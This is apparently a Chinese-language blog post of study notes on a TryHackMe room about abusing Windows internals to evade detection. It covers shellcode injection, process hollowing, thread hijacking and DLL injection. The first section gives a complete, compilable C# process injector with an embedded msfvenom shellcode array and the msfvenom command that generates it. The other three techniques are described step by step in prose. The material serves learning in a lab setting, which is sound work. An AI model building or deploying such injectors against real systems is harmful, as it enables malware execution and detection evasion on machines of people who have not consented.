# Abusing Windows Internals

**从这一章开始，讲的东西也是非常的重要，我个人认为可能对于未来的进一步学习有着重要的影响**

**还是老样子，非必要的情况下，我只展示C#版本的代码**

**利用Windows内部组件，使用与工具无关的现代方法避开常见的检测解决方案。**

Windows 内部是 Windows 操作系统运行方式的核心;这为对手提供了一个有利可图的恶意使用目标。Windows 内部可用于隐藏和执行代码、逃避检测以及与其他技术或漏洞链接。

---

# 滥用进程

进程注入通常用作一个总体术语，用于描述通过合法功能或组件将恶意代码注入进程。我们将在这个房间里重点介绍四种不同类型的工艺注入，概述如下。

![在这里插入图片描述](https://img-blog.csdnimg.cn/91a18e87f0c748848db1ccca1afb285f.png)

### 进程注入

在最基本的层面上，进程注入采用shellcode注入的形式。

在高级别上，shellcode 注入可以分为四个步骤：

1) 打开具有所有访问权限的目标进程。
2) 为外壳代码分配目标进程内存。
3) 将外壳代码写入目标进程中分配的内存。
4) 使用远程线程执行外壳代码。

在 shellcode 注入的第一步，我们需要使用特殊参数打开一个目标进程。 OpenProcess用于打开通过命令行提供的目标进程。

```csharp
[DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

...

IntPtr processHandle = OpenProcess(0x001F0FFF, false, Uint.Parse(args[0]));
```

有关C#调用win api的信息可以在pinvoke.net和微软官方文档上找到

在第二步，我们必须为外壳代码的字节大小分配内存。内存分配使用 VirtualAllocEx

```csharp
[DllImport("kernel32.dll", SetLastError=true, ExactSpelling =true)]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

...

// 0x3000表示MEM_RESERVE和MEM_COMMIT
// 0x40表示PAGE_EXECUTE_READWRITE
IntPtr address = VirtualAllocEx(processHandle, IntPtr.Zero, 0x1000, 0x3000, 0x40);
```

在第三步，我们现在可以使用分配的内存区域来编写我们的外壳代码。 WriteProcessMemory通常用于写入内存区域。

```csharp
[DllImport("kernel32.dll", SetLastError=true)]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

...

IntPtr size;
WriteProcessMemory(processHandle, address, shellcode, shellcode.Length, out size);
```

在第四步，我们现在控制了进程，我们的恶意代码现在被写入内存。要执行驻留在内存中的外壳代码，我们可以使用CreateRemoteThread 创建在另一个进程的虚拟地址空间中运行的线程.

```csharp
[DllImport("kernel32.dll")]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

...

CreateRemoteThread(processHandle, IntPtr.Zero, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
```

使用msf生成shellcode

	msfvenom -p windows/x64/exec cmd='cmd.exe' -f csharp

完整代码：

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);
    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    static void Main(string[] args)
    {
        if (args.Length == 0)
        {
            return;
        }

        byte[] shellcode = new byte[275] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
            0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
            0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
            0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
            0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
            0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
            0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,0x64,
            0x2e,0x65,0x78,0x65,0x00};

        IntPtr processHandle = OpenProcess(0x001F0FFF, false, uint.Parse(args[0]));
        IntPtr address = VirtualAllocEx(processHandle, IntPtr.Zero, 0x1000, 0x3000, 0x40);
        
        IntPtr size;
        WriteProcessMemory(processHandle, address, shellcode, shellcode.Length, out size);

        CreateRemoteThread(processHandle, IntPtr.Zero, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
    }

}
```

使用csc编译，然后启动一个notepad.exe，使用tasklist查看pid，运行我们的进程注入器

![在这里插入图片描述](https://img-blog.csdnimg.cn/4c9b09fa091b4a428eff590883c818f3.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/982109173dbd455e97c6f52222c22abd.png)

可以看到刚刚打开的notepad没了，并且打开了一个cmd, 也就是说执行了我们的shellcode

![在这里插入图片描述](https://img-blog.csdnimg.cn/1b7d9e7d3fe444eab402e029f5ad6272.png)

## 进程Hollowing

在上一个任务中，我们讨论了如何使用shellcode注入将恶意代码注入到合法进程中。在此任务中，我们将介绍进程镂空。与shellcode注入类似，这种技术提供了将整个恶意文件注入进程的能力。这是通过“挖空”或取消映射进程并将特定的PE数据和部分注入进程来实现的。

镂空可以分为六个步骤：

1) 创建处于挂起状态的目标进程。
2) 打开恶意image。
3) 从进程内存中取消映射合法代码。
4) 为恶意代码分配内存位置，并将每个部分写入地址空间。
5) 设置恶意代码的入口点。
6) 使目标进程脱离挂起状态。

**由于代码太多，后面的我就不贴代码了，因为基本都是借助pinvoke.net来将C++翻译成C#的, C++的代码在thm的机器中均有提供**

在进程镂空的第一步，我们必须使用 CreateProcessA. 要获取 API 调用所需的参数，我们可以使用以下结构 STARTUPINFOA 和 PROCESS_INFORMATION

在第二步中，我们需要打开一个恶意image进行注入。此过程分为三个步骤，首先使用 CreateFileA 获取恶意映像的句柄.

获取恶意映像的句柄后，必须使用 VirtualAlloc. GetFileSize 还用于检索恶意图像的大小 dwSize.

现在内存已分配给本地进程，必须写入内存。使用从前面步骤中获得的信息，我们可以使用 ReadFile 写入本地进程内存.

在第三步，必须通过取消映射内存来“挖空”该过程。在取消映射之前，我们必须确定 API 调用的参数。我们需要确定进程在内存中的位置和入口点。中央处理器寄存器 EAX （入口点），以及 EBX （PEB位置）包含我们需要获取的信息;这些可以通过使用 GetThreadContext. 找到两个寄存器后, ReadProcessMemory 用于从 EBX 带偏移量 (0x8), 通过检查PEB获得.

存储基址后，我们可以开始取消映射内存。我们可以使用 ZwUnmapViewOfSection 从 NTDLL 导入.dll以释放目标进程中的内存.

在第四步，我们必须首先在空心过程中分配内存。我们可以使用 VirtualAlloc 类似于分配内存的步骤二。这次我们需要获取在文件头中找到的图像大小. e_lfanew 可以识别从 DOS 标头到 PE 标头的字节数。到达 PE 标头后，我们可以获得 SizeOfImage 从可选标头.

分配内存后，我们可以将恶意文件写入内存。因为我们正在写入文件，所以我们必须首先写入 PE 标头，然后写入 PE 部分。要写入 PE 标头，我们可以使用 WriteProcessMemory 以及标头的大小，以确定停止的位置.

现在我们需要编写每个部分。要查找部分的数量，我们可以使用  NumberOfSections 从 NT 标头。我们可以循环通过 e_lfanew 以及用于写入每个部分的当前标头的大小.

在第五步，我们可以使用 SetThreadContext 要更改 EAX 指向入口点.

在第六步，我们需要使用 ResumeThread.

## 线程hijacking

劫持可以分为十个步骤：

1) 找到并打开要控制的目标进程。
2) 为恶意代码分配内存区域。
3) 将恶意代码写入分配的内存。
4) 标识要劫持的目标线程的线程 ID。
5) 打开目标线程。
6) 挂起目标线程。
7) 获取线程上下文。
8) 更新指向恶意代码的指令指针。
9) 重写目标线程上下文。
10) 恢复被劫持的线程。

**由于代码太多，后面的我就不贴代码了，因为基本都是借助pinvoke.net来将C++翻译成C#的, C++的代码在thm的机器中均有提供**

我们将分解一个基本的线程劫持脚本，以确定每个步骤，并在下面更深入地解释。

该技术中概述的前三个步骤遵循与正常过程注入相同的常见步骤。

一旦初始步骤结束并且我们的shellcode被写入内存，我们就可以进入第四步。在第四步，我们需要通过识别线程 ID 来开始劫持进程线程的过程。要识别线程ID，我们需要使用三个Windows API调用: CreateToolhelp32Snapshot(), Thread32First(), and Thread32Next(). 这些 API 调用将共同循环访问进程的快照，并扩展功能以枚举进程信息.

在第五步，我们已经在结构指针中收集了所有必需的信息，并且可以打开目标线程。要打开我们将使用的线程 OpenThread 与 THREADENTRY32 结构指针.

在第六步，我们必须挂起打开的目标线程。要挂起我们可以使用的线程 SuspendThread.

在第七步，我们需要获取要在即将到来的 API 调用中使用的线程上下文。这可以通过以下方式完成 GetThreadContext 存储指针.

在第八步，我们需要覆盖RIP（指令指针寄存器）以指向我们的恶意内存区域。如果您还不熟悉 CPU 寄存器，RIP 是一个 x64 寄存器，它将确定下一个代码指令;简而言之，它控制内存中应用程序的流。要覆盖寄存器，我们可以更新 RIP 的线程上下文.

在步骤 9 中，上下文已更新，需要更新为当前线程上下文。这可以使用 SetThreadContext 和上下文的指针.

在最后一步，我们现在可以使目标线程脱离挂起状态。为此，我们可以使用 ResumeThread.

## DLL注入

DLL 注入可以分为五个步骤：

1) 找到要注入的目标进程。
2) 打开目标进程。
3) 为恶意 DLL 分配内存区域。
4) 将恶意 DLL 写入分配的内存。
5) 加载并执行恶意 DLL。

**由于代码太多，后面的我就不贴代码了，因为基本都是借助pinvoke.net来将C++翻译成C#的, C++的代码在thm的机器中均有提供**

我们将分解一个基本的 DLL 注入器，以确定每个步骤，并在下面更深入地解释。

在 DLL 注入的第一步，我们必须找到一个目标线程。可以使用三个 Windows API 调用从进程中定位线程: CreateToolhelp32Snapshot(), Process32First(), and Process32Next().

在第二步，枚举 PID 后，我们需要打开该进程。这可以通过各种 Windows API 调用来实现。: GetModuleHandle, GetProcAddress, or OpenProcess.

在步骤 3 中，必须为提供的恶意 DLL 分配内存才能驻留。与大多数喷油器一样，这可以使用 VirtualAllocEx.

在第四步，我们需要将恶意 DLL 写入分配的内存位置。我们可以使用 WriteProcessMemory 写入分配的区域.

在第五步，我们的恶意DLL被写入内存，我们需要做的就是加载并执行它。要加载 DLL，我们需要使用 LoadLibrary; 进口自 kernel32. 加载后, CreateRemoteThread 可用于使用 LoadLibrary 作为启动函数.

